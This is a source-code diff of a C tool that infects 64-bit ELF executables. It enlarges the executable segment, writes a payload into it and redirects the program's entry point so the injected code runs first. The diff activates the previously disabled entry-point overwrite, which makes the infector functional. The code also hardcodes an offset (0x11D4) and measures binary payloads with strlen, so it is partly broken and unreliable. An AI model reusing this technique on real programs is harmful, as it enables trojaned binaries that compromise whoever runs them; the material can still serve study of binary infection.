@@ -89,6 +89,8 @@ int swap_entry_point(FILE *binary, int entry_address)
     int count = 0;
     Elf64_Ehdr header;
 
+    rewind(binary);
+
     count = fread(&header, sizeof(Elf64_Ehdr), 1, binary);
     if (count <= 0)
     {
@@ -203,8 +205,20 @@ int expand_execuable_segment(FILE *binary, Elf64_Addr exe_ph_start, Elf64_Phdr e
     return old_end;
 }
 
-int inject_payload(FILE *binary, Elf64_Addr prev_exe_ph_end, uint8_t *payload)
+int inject_payload(FILE *binary, Elf64_Addr injection_site, uint8_t *payload)
 {
+    int retval = 0;
+
+    rewind(binary);
+
+    fseek(binary, injection_site, SEEK_CUR);
+    retval = fwrite(payload, strlen(payload), 1, binary);
+    if (retval <= 0)
+    {
+        puts("unable to write payload");
+        return 1;
+    }
+
     return 0;
 }
 
@@ -217,8 +231,8 @@ int main(int argc, char *argv[])
     int payload_size = 0;
     FILE *binary = NULL;
     Elf64_Phdr exe_ph;
-    Elf64_Addr exe_ph_start;    //where executable program header begins
-    Elf64_Addr prev_exe_ph_end; //where exe ph ends before modification
+    Elf64_Addr exe_ph_start;         //where executable program header begins
+    Elf64_Addr prev_exe_segment_end; //where exe ph ends before modification
     uint8_t *payload = NULL;
 
     memset(&exe_ph, 0, sizeof(exe_ph));
@@ -245,7 +259,7 @@ int main(int argc, char *argv[])
         goto cleanup;
     }
 
-    exe_ph_start = find_executable_ph(binary, &exe_ph, ph_start, ph_num); //using ftell, change exe_segment to ph addr
+    exe_ph_start = find_executable_ph(binary, &exe_ph, ph_start, ph_num);
     if (exe_ph_start <= 0)
     {
         puts("Failed to find executable segment");
@@ -283,30 +297,30 @@ int main(int argc, char *argv[])
 
     printf("Original exe segment size: %d\n", exe_ph.p_filesz);
 
-    prev_exe_ph_end = expand_execuable_segment(binary, exe_ph_start, exe_ph, payload_size);
-    if (prev_exe_ph_end <= 0)
+    prev_exe_segment_end = expand_execuable_segment(binary, exe_ph_start, exe_ph, payload_size + 0x100);
+    if (prev_exe_segment_end <= 0)
     {
         puts("Failed to expand executable segment");
         goto cleanup;
     }
 
-    printf("Writing payload to old segment end: 0x%x\n", prev_exe_ph_end);
+    printf("Writing payload to address: 0x%x\n", 0x11D4);
 
-    retval = inject_payload(binary, prev_exe_ph_end, payload);
+    retval = inject_payload(binary, 0x11D4, payload);
     if (retval > 0)
     {
         puts("Failed to inject payload");
         goto cleanup;
     }
 
-    /*retval = swap_entry_point(binary, 0x401122);
+    retval = swap_entry_point(binary, exe_ph.p_vaddr + 0x1D4);
     if (retval > 0)
     {
         puts("Failed to swap entry point");
         goto cleanup;
     }
 
-    puts("Successfully overwrote entry point");*/
+    puts("Successfully overwrote entry point");
 
 cleanup:
     fclose(binary);
